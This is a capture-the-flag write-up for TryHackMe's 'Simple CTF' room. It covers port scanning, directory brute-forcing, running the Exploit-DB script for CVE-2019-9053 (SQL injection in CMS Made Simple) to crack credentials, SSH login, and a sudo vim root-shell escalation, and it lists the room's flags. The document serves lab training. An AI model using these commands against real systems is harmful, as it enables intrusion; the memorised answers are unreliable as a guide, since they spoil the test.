# Simple CTF — TryHackMe

## Overview
This document summarizes the steps taken to solve the **Simple CTF** room on TryHackMe.  
The objective was to enumerate services, find a vulnerable web application, exploit it, gain user access, then escalate privileges to root.

---

## 1. Port Scanning

We start with a full port scan to discover open services:

```bash
nmap -A -T4 -Pn <IP>
```

### Open Ports
- **21/tcp** — FTP (anonymous login enabled)
- **80/tcp** — HTTP (Apache2 Default Page)
- **2222/tcp** — SSH

![Nmap Scan](nmap_simple_ctf.png)

**Answer:**  
How many services are running under port 1000? → **2**  
What is running on the higher port? → **SSH**

---

## 2. FTP Enumeration

We attempt to log in via FTP:

```bash
ftp <IP>
```

- Login as `anonymous` works
- Only a directory named `ftp` is visible
- No read permissions → nothing useful found

---

## 3. Web Enumeration

Visiting the website on port **80** shows the Apache default page.

### Directory Brute-Forcing

We enumerate directories using Gobuster:

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/big.txt
```

Gobuster discovers the endpoint:

```
/simple
```

![Gobuster Result](gobuster_simple_ctf.png)

---

## 4. CMS Identification

Accessing `/simple` reveals **CMS Made Simple**, version **2.2.8**.

![CMS Page](cms.png)

After searching on Exploit-DB, we find:

- **CVE-2019-9053**
- Vulnerability type: **SQL Injection (SQLi)**

![Exploit DB](cms2.png)

**Answers:**
- What's the CVE you're using against the application? → **CVE-2019-9053**
- To what kind of vulnerability is the application vulnerable? → **SQL Injection**

---

## 5. Exploitation

We download the exploit from Exploit-DB (`46635.py`).

### Exploit Parameters
- `-u` : Target URL
- `-c` : Crack password hashes
- `-w` : Wordlist for cracking

### Exploit Execution

```bash
python3 46635.py -u http://<IP>/simple -c -w /usr/share/wordlists/rockyou.txt
```

### Result
- **Username:** `mitch`
- **Password:** `secret`

**Answer:**  
What's the password? → **secret**

---

## 6. SSH Access

Using the obtained credentials, we log in via SSH:

```bash
ssh mitch@<IP> -p 2222
```

**Answer:**  
Where can you login with the details obtained? → **SSH**

---

## 7. User Flag

After login:

```bash
ls
cat user.txt
```

User flag:

```
G00d j0b, keep up!
```

**Answer:**  
What's the user flag? → **G00d j0b, keep up!**

We also notice another user directory:

```
sunbath
```

**Answer:**  
Is there any other user in the home directory? What's its name? → **sunbath**

---

## 8. Privilege Escalation

We check sudo permissions:

```bash
sudo -l
```

Result:
```
(root) NOPASSWD: /usr/bin/vim
```

Using **GTFOBins**, we find that `vim` can spawn a root shell.

### Privilege Escalation Command

```bash
sudo vim -c ':!/bin/sh'
```

This opens a root shell.

**Answer:**  
What can you leverage to spawn a privileged shell? → **vim**

---

## 9. Root Flag

```bash
cd /root
ls
cat root.txt
```

Root flag:

```
W3ll d0n3. You made it!
```

**Answer:**  
What's the root flag? → **W3ll d0n3. You made it!**

---

## Conclusion

This CTF demonstrated:
- Basic service enumeration
- Directory brute-forcing
- Identifying a vulnerable CMS
- Exploiting an SQL injection
- Credential reuse for SSH access
- Privilege escalation using misconfigured sudo permissions


